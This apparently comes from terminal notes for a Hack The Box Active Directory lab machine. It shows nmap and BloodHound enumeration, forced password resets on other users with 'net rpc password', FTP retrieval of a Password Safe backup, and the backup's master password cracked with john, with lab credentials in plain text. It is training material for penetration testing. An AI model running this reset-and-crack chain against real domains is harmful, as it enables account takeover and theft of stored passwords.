```
┌──(yus3r㉿kali)-[~/Tools]  
└─$ sudo nmap 10.129.102.98 -Pn -sV    
[sudo] password for yus3r:    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 18:57 +0200  
Stats: 0:01:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 99.99% done; ETC: 18:59 (0:00:00 remaining)  
Nmap scan report for 10.129.102.98  
Host is up (0.14s latency).  
Not shown: 987 closed tcp ports (reset)  
PORT     STATE SERVICE       VERSION  
21/tcp   open  ftp           Microsoft ftpd  
53/tcp   open  domain        Simple DNS Plus  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-07 04:24:17Z)  
135/tcp  open  msrpc         Microsoft Windows RPC  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site:  
Default-First-Site-Name)  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  tcpwrapped  
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site:  
Default-First-Site-Name)  
3269/tcp open  tcpwrapped  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 15986.93 seconds
```

```
┌──(yus3r㉿kali)-[~/HTB machines/Medium/Windows/Administrator]  
└─$ bloodhound-python -d administrator.htb -c all -u Olivia -p ichliebedich -ns 10.129.102.98 -k --zip  
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)  
INFO: Found AD domain: administrator.htb  
INFO: Getting TGT for user  
INFO: Connecting to LDAP server: dc.administrator.htb  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: dc.administrator.htb  
INFO: Found 11 users  
INFO: Found 53 groups  
INFO: Found 2 gpos  
INFO: Found 1 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: dc.administrator.htb  
INFO: Done in 00M 31S  
INFO: Compressing output into 20261007064124_bloodhound.zip
```

![[Pasted image 20261006234827.png]]

```
┌──(yus3r㉿kali)-[~/Tools/BloodHound.py]  
└─$ net rpc password "michael" "pass123!" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "DC.adminis  
trator.htb"
```

```
┌──(yus3r㉿kali)-[~/Tools/BloodHound.py]  
└─$ nxc smb 10.129.102.98 -d administrator.htb -u michael -p pass123!  
SMB         10.129.102.98   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (  
domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.102.98   445    DC               [+] administrator.htb\michael:pass123!
```

![[Pasted image 20261007084626.png]]

```
┌──(yus3r㉿kali)-[~/Tools/BloodHound.py]  
└─$ net rpc password "benjamin" "pass123!" -U "administrator.htb"/"michael"%"pass123!" -S "DC.administr  
ator.htb"  
  
┌──(yus3r㉿kali)-[~/Tools/BloodHound.py]  
└─$ nxc smb 10.129.102.98 -d administrator.htb -u benjamin -p pass123!  
SMB         10.129.102.98   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (  
domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.102.98   445    DC               [+] administrator.htb\benjamin:pass123!
```

```
┌──(yus3r㉿kali)-[~/Tools/BloodHound.py]  
└─$ ftp benjamin@10.129.102.98    
Connected to 10.129.102.98.  
220 Microsoft FTP Service  
331 Password required  
Password:    
230 User logged in.  
Remote system type is Windows_NT.  
ftp>    
ftp> dir  
229 Entering Extended Passive Mode (|||52340|)  
125 Data connection already open; Transfer starting.  
10-05-24  09:13AM                  952 Backup.psafe3  
226 Transfer complete.  
ftp> get Backup.psafe3  
local: Backup.psafe3 remote: Backup.psafe3  
229 Entering Extended Passive Mode (|||52341|)  
125 Data connection already open; Transfer starting.  
100% |**********************************************************|   952        7.79 KiB/s    00:00 ETA  
226 Transfer complete.  
WARNING! 3 bare linefeeds received in ASCII mode.  
File may not have transferred correctly.  
952 bytes received in 00:00 (7.78 KiB/s)  
ftp> help  
Commands may be abbreviated.  Commands are:  
  
!               disconnect      less            newer           rate            status  
$               edit            lpage           nlist           rcvbuf          struct  
account         epsv            lpwd            nmap            recv            sunique  
append          epsv4           ls              ntrans          reget           system  
ascii           epsv6           macdef          open            remopts         tenex  
bell            exit            mdelete         page            rename          throttle  
binary          features        mdir            passive         reset           trace  
bye             fget            mget            pdir            restart         type  
case            form            mkdir           pls             rhelp           umask  
cd              ftp             mls             pmlsd           rmdir           unset  
cdup            gate            mlsd            preserve        rstatus         usage  
chmod           get             mlst            progress        runique         user  
close           glob            mode            prompt          send            verbose  
connect         hash            modtime         proxy           sendport        xferbuf  
cr              help            more            put             set             ?  
debug           idle            mput            pwd             site  
delete          image           mreget          quit            size  
dir             lcd             msend           quote           sndbuf  
ftp> ls  
229 Entering Extended Passive Mode (|||52344|)  
125 Data connection already open; Transfer starting.  
10-05-24  09:13AM                  952 Backup.psafe3  
226 Transfer complete.  
ftp> cd ..  
250 CWD command successful.  
ftp> ls  
229 Entering Extended Passive Mode (|||52345|)  
125 Data connection already open; Transfer starting.  
10-05-24  09:13AM                  952 Backup.psafe3  
226 Transfer complete.  
ftp> exit  
221 Goodbye.
```

```
┌──(yus3r㉿kali)-[~/HTB machines/Medium/Windows/Administrator]  
└─$ pwsafe2john Backup.psafe3  
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c1016725241  
0ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050  
  
┌──(yus3r㉿kali)-[~/HTB machines/Medium/Windows/Administrator]  
└─$ echo 'Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c  
10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050' > db.hash  
  
┌──(yus3r㉿kali)-[~/HTB machines/Medium/Windows/Administrator]  
└─$ john db.hash --wordlist=/home/yus3r/Tools/SecLists/Passwords/rockyou.txt  
Using default input encoding: UTF-8  
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])  
Cost 1 (iteration count) is 2048 for all loaded hashes  
Will run 7 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
tekieromucho     (Backu)        
1g 0:00:00:00 DONE (2026-10-07 07:12) 6.666g/s 47786p/s 47786c/s 47786C/s 123456..emoemo  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```

![[Pasted image 20261007084810.png]]

